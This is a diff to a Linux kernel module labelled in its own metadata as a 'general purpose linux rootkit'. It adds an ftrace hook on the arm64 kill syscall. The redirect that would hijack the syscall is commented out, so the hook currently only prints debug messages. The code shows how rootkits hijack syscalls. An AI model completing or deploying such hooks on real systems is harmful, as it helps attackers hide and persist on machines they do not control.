@@ -6,6 +6,11 @@
 #include <linux/ftrace.h>
 #include <asm/unistd.h>
 
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("0xwillow");
+MODULE_DESCRIPTION("general purpose linux rootkit");
+MODULE_VERSION("1.0");
+
 struct ftrace_hook {
     const char *name;
     void *new;
@@ -47,10 +52,11 @@ static int fh_get_func_addr(struct ftrace_hook *hook) {
 }
 
 static notrace void fh_callback(unsigned long pc, unsigned long parent_pc, struct ftrace_ops *ops, struct pt_regs *regs) {
-    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
-    if (!within_module(parent_pc, THIS_MODULE)) {
-        regs->pc = (unsigned long) hook->new;
-    }
+    // struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+    // if (!within_module(parent_pc, THIS_MODULE)) {
+    //     regs->pc = (unsigned long) hook->new;
+    // }
+    pr_info("debug: fh_callback called, FTRACE_OPS_FL_SAVE_REGS not enabled :(\n");
 }
 
 int fh_install_hook(struct ftrace_hook *hook) {
@@ -65,9 +71,9 @@ int fh_install_hook(struct ftrace_hook *hook) {
     }
 
     hook->ops.func = fh_callback;
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
-                    | FTRACE_OPS_FL_RECURSION_SAFE
-                    | FTRACE_OPS_FL_IPMODIFY;
+    // hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+    //                 | FTRACE_OPS_FL_RECURSION_SAFE
+    //                 | FTRACE_OPS_FL_IPMODIFY;
 
     // err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
     // if (err) {
@@ -94,3 +100,33 @@ void fh_remove_hook(struct ftrace_hook *hook) {
     unregister_ftrace_function(&hook->ops);
     ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
 }
+
+static asmlinkage int (*orig_kill) (const struct pt_regs *);
+
+asmlinkage notrace int hook_kill(const struct pt_regs *regs) {
+    pr_info("debug: hooked kill :D\n");
+    return 0;
+    // return orig_kill(regs);
+}
+
+static struct ftrace_hook hook = {"__arm64_sys_kill", hook_kill, &orig_kill, 0, {NULL, NULL, NULL}};;
+
+static int __init hook_test_mod_init(void) {
+    int err;
+    err = fh_install_hook(&hook);
+    if (err) {
+        pr_info("debug: fh_install_hook failed\n");
+        return err;
+    }
+    pr_info("debug: module loaded\n");
+    return 0;
+}
+
+static void __exit hook_test_mod_exit(void) {
+    fh_remove_hook(&hook);
+    pr_info("debug: module unloaded\n");
+}
+
+
+module_init(hook_test_mod_init);
+module_exit(hook_test_mod_exit);
